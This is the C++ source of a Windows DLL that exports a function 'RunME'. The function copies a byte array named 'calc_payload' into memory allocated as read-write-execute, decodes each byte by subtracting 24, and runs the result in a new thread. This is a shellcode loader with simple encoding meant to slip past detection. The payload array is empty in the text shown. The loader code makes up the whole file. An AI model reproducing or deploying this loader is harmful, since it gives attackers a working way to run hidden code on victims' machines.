#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

BOOL APIENTRY DllMain(HMODULE hModule,  DWORD  ul_reason_for_call, LPVOID lpReserved) {

    switch (ul_reason_for_call)  {
    case DLL_PROCESS_ATTACH:
    case DLL_PROCESS_DETACH:
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
        break;
    }
    return TRUE;
}

extern "C" {
__declspec(dllexport) BOOL WINAPI RunME(void) {

    const char calc_payload[] = { };

	PVOID now_exec = VirtualAlloc(0, sizeof calc_payload, MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	RtlCopyMemory(now_exec, calc_payload, sizeof calc_payload);
	DWORD threadID;
    
    for (int i = 0; i < sizeof calc_payload; i++) {
              unsigned int ia = (unsigned int)(((char*)now_exec)[i]) - 24;
              (((char*)now_exec)[i]) = (byte)(ia & 0xFF);
	}
	HANDLE hThread = CreateThread(NULL, 0, (PTHREAD_START_ROUTINE)now_exec, NULL, 0, &threadID);
	WaitForSingleObject(hThread, INFINITE);

    return 0;
    }
}